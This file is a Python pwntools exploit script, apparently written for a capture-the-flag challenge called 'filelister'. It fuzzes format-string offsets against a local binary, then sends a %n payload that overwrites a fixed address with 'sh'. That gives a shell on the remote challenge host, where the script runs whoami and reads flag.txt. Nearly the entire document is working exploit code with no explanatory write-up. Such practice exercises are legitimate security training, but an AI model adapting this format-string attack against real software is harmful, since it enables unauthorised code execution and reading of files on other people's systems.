from pwn import *

HOST = '3qo9k5hk5cprtqvnlkvotlnj9d14b7mt.ctf.sg'
PORT = 30301



'''
# Faulty code that doesn't work that well
import binascii
def converter(string):
    found_bytes = binascii.hexlify(string.encode('ascii'))
    return int.from_bytes(found_bytes, 'little')

print(converter("sh")) #
'''
def hex_to_string(val):
    val = val.replace('0x', '')
    return bytearray.fromhex(val)
## Referring to the ascii lookup table
def generate_payload(address_location, payload2_padding=0,mode2 ="n", address=p64(0x601058)):
    length = 0x00006873 # Value of "sh"
    ### Payload ############################
    length = length
    padding = f"%{length}p".encode()

    location = address_location
    write = f"%{location}${mode2}".encode()
    padding2 = b"B" * payload2_padding

    #address = b"AAAAAAAA"#
    #address =  # You have to put this at the back
    payload = padding + write + padding2 + address
    return payload


### Fuzzing ############################################################################################
#with open("/tmp/inputfile" , 'wb') as f: f.write(payload)
#print(payload)
#while True: pass
def run(payload, REMOTE=True):
    #if True:
    if REMOTE:
        io = remote(HOST, PORT)  # Comment this out when testing locally
    else:
        io = process("Given/filelister")
    io.send(payload+b"\n")
    io.send("whoami\n")
    io.send("cat /home/filelister/flag.txt\n")
    io.send("exit\n")

    io.recvuntil("Greetings")
    fmstr = io.recvuntil("Here are my files!").decode()
    data = io.recvall().decode()
    io.close()
    return fmstr, data
    #io.interactive()

### Fuzzing length to find the one which goes to correct address
final_payload = ()
x = []
for i in range(1, 10):
    for j in range(0,8):
        payload = generate_payload(i,j, 'p', b"AAAAAAAA")
        fmstr, data = run(payload, False)
        fmstr = fmstr.replace(" ", '')

        record = [(i,j)]
        record.append(payload)
        record.append(fmstr[:14])
        record.append(fmstr[14:].replace("Herearemyfiles!", '').replace('\n', ''))
        record.append(record[-1].replace("A", '').replace("B",""))
        try:
            record.append(
                hex_to_string(record[-1])
            )
            record.append(record[-1].decode())
            if record[-1] == "AAAAAAAA":
                final_payload = (i,j)
        except:
            pass

        x.append(record)

        #print(fmstr)
        #print(data)

        if "filelister" in data:
            print(i,j)
            break
for i in x:
    print(i)

### Actual Payload ##############################################################
print(final_payload)
actual_payload = generate_payload(final_payload[0],final_payload[1], 'n')
print(actual_payload)

io = remote(HOST, PORT)
#io = process("Given/filelister")
io.send(actual_payload+b"\n")

io.send("whoami\n")
io.send("cat /home/filelister/flag.txt\n")
io.interactive()
io.send("exit\n")
